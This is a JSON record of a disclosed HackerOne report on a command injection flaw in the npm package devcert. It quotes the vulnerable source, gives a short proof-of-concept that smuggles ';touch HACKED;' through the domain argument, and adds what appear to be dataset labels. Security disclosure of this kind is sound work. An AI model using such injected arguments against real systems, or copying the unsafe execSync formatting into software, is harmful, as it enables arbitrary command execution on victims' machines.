{
  "reported_to": "Node.js third-party modules",
  "reported_by": "d3lla ",
  "title": "[devcert] Command Injection via insecure command formatting",
  "content": "\nI would like to report a Command Injection issue in the devcert module.\nIt allows to execute arbitrary commands on the victim's PC.\nModule\nmodule name: devcert\nversion: 1.1.0\nnpm page: https://www.npmjs.com/package/devcert\nModule Description\ndevcert - Development SSL made easy\nModule Stats\n[276,467] weekly downloads\nVulnerability\nVulnerability Description\nThe issue occurs because a user input parameter is used inside a command that is executed without any check.\nI tested the certificateFor function.\nHere's the code which causes the issue:\nCode 3.19 KiB\n1// https://github.com/davewasmer/devcert/blob/2b1b8d40eda251616bf74fd69f00ae8222ca1171/src/index.ts#L95\n2\n3export async function certificateFor<O extends Options>(domain: string, options: O = {} as O): Promise<IReturnData<O>> { // <-- starting point\n4  debug(`Certificate requested for ${ domain }. Skipping certutil install: ${ Boolean(options.skipCertutilInstall) }. Skipping hosts file: ${ Boolean(options.skipHostsFile) }`);\n5\n6  if (options.ui) {\n7    Object.assign(UI, options.ui);\n8  }\n9\n10  if (!isMac && !isLinux && !isWindows) {\n11    throw new Error(`Platform not supported: \"${ process.platform }\"`);\n12  }\n13\n14  if (!commandExists('openssl')) {\n15    throw new Error('OpenSSL not found: OpenSSL is required to generate SSL certificates - make sure it is installed and available in your PATH');\n16  }\n17\n18  let domainKeyPath = pathForDomain(domain, `private-key.key`);\n19  let domainCertPath = pathForDomain(domain, `certificate.crt`);\n20\n21  if (!exists(rootCAKeyPath)) {\n22    debug('Root CA is not installed yet, so it must be our first run. Installing root CA ...');\n23    await installCertificateAuthority(options);\n24  } else if (options.getCaBuffer || options.getCaPath) {\n25    debug('Root CA is not readable, but it probably is because an earlier version of devcert locked it. Trying to fix...');\n26    await ensureCACertReadable(options);\n27  }\n28\n29  if (!exists(pathForDomain(domain, `certificate.crt`))) { \n30    debug(`Can't find certificate file for ${ domain }, so it must be the first request for ${ domain }. Generating and caching ...`);\n31    await generateDomainCertificate(domain); // <-- domain is our payload\n32  }\n33  ....\n34\n35\n36...\n37// https://github.com/davewasmer/devcert/blob/master/src/constants.ts#L19\n38export const pathForDomain: (domain: string, ...pathSegments: string[]) => string = path.join.bind(path, domainsDir)\n39...\n40\n41// https://github.com/davewasmer/devcert/blob/master/src/certificates.ts#L44\n42...\n43export default async function generateDomainCertificate(domain: string): Promise<void> {\n44  mkdirp(pathForDomain(domain));\n45\n46  debug(`Generating private key for ${ domain }`);\n47  let domainKeyPath = pathForDomain(domain, 'private-key.key');  // <-- the variable is in the form \n48  generateKey(domainKeyPath);\n49\n50  debug(`Generating certificate signing request for ${ domain }`);\n51  let csrFile = pathForDomain(domain, `certificate-signing-request.csr`);\n52  withDomainSigningRequestConfig(domain, (configpath) => {\n53    openssl(`req -new -config \"${ configpath }\" -key \"${ domainKeyPath }\" -out \"${ csrFile }\"`);\n54  });\n55\n56  debug(`Generating certificate for ${ domain } from signing request and signing with root CA`);\n57  let domainCertPath = pathForDomain(domain, `certificate.crt`);\n58\n59  await withCertificateAuthorityCredentials(({ caKeyPath, caCertPath }) => {\n60    withDomainCertificateConfig(domain, (domainCertConfigPath) => {\n61      openssl(`ca -config \"${ domainCertConfigPath }\" -in \"${ csrFile }\" -out \"${ domainCertPath }\" -keyfile \"${ caKeyPath }\" -cert \"${ caCertPath }\" -days 825 -batch`)\n62    });\n63  });\n64}\n65\n66// Generate a cryptographic key, used to sign certificates or certificate signing requests.\n67export function generateKey(filename: string): void {\n68  debug(`generateKey: ${ filename }`);  // <-- injection\n69  openssl(`genrsa -out \"${ filename }\" 2048`);\n70  chmod(filename, 400);\n71}\nThe input parameter domain is used to build the domainKeyPath variable.\nIf we pass \\\";touch HACKED;\\\" as input, the variable domainKeyPath will be something like this: /home/ubuntu/.config/devcert/domains/\";touch HACKED;\"/private-key.key (the first part depends on your OS).\nAs we can see the variable contains a valid shell command. Then, this variable is passed to the function generateKey, that finally calls openssl function:\nCode 832 Bytes\n1// https://github.com/davewasmer/devcert/blob/master/src/utils.ts#L12\n2import { execSync, ExecSyncOptions } from 'child_process';\n3import tmp from 'tmp';\n4import createDebug from 'debug';\n5import path from 'path';\n6import sudoPrompt from 'sudo-prompt';\n7\n8import { configPath } from './constants';\n9\n10const debug = createDebug('devcert:util');\n11\n12export function openssl(cmd: string) {\n13  return run(`openssl ${ cmd }`, {  // <-- the command executed is: openssl genrsa -out \"/home/ubuntu/.config/devcert/domains/\";touch HACKED;\"/private-key.key\" 2048\n14    stdio: 'pipe',\n15    env: Object.assign({\n16      RANDFILE: path.join(configPath('.rnd'))\n17    }, process.env)\n18  });\n19}\n20\n21export function run(cmd: string, options: ExecSyncOptions = {}) {\n22  debug(`exec: \\`${ cmd }\\``);\n23  return execSync(cmd, options);  // <-- call child_process.execSync \n24}\n25...\n26\nSteps To Reproduce:\ncreate a directory for testing\nmkdir poc\ncd poc/\nmkdir poc\ncd poc/\ninstall devcert module:\nnpm i devcert\nnpm i devcert\ncreate the following PoC JavaScript file (poc.js):\nCode 133 Bytes\n1const devcert = require('devcert');\n2\n3async function poc() {\n4    let ssl = await devcert.certificateFor('\\\";touch HACKED;\\\"');\n5}\n6poc()\nmake sure that the HACKED file does not exist:\nls\nls\nexecute the poc.js file:\nnode poc.js\nnode poc.js\nthe HACKED file is created:\nls\nls\nPatch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it.\nIn my opinion, it's better to use child_process.execFile or child_process.spawn functions instead of child_process.execSync.\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v13.13.0\nNPM VERSION: 6.14.4\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nCommand Injection on devcert module via insecure command formatting.\n\n",
  "severity": [
    9.8,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1592251320,
  "report_url": "https://hackerone.com/reports/863544",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a directory for testing and install the devcert module: `mkdir poc && cd poc && npm i devcert`"
    ],
    [
      2,
      "Create a PoC JavaScript file (poc.js) with the following content: `const devcert = require('devcert'); async function poc() { let ssl = await devcert.certificateFor('\\\";touch HACKED;\\\"'); } poc()`"
    ],
    [
      3,
      "Execute the poc.js file: `node poc.js`"
    ],
    [
      4,
      "Verify the HACKED file is created: `ls`"
    ]
  ],
  "vuln_description": "The vulnerability is a command injection issue in the devcert module where the `domain` parameter is used unsafely in a command executed via `child_process.execSync`. An attacker can inject arbitrary commands through the `domain` parameter, which are then executed on the victim's system.",
  "reason": "The vulnerability involves a straightforward command injection where user input is directly concatenated into a command string without proper sanitization. The attack requires understanding the flow of the `domain` parameter through the code to the point of command execution, but does not involve complex interactions or state manipulation.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection via user-controlled input (domain parameter) being passed unsanitized into a shell command. The proposed methodologies focus on authentication and authorization (AuthN/AuthZ) bypasses and IDOR vulnerabilities, which are different from command injection vulnerabilities. The methodologies do not cover the detection of insecure command formatting or shell injection vulnerabilities.",
    "is_detectable": false
  }
}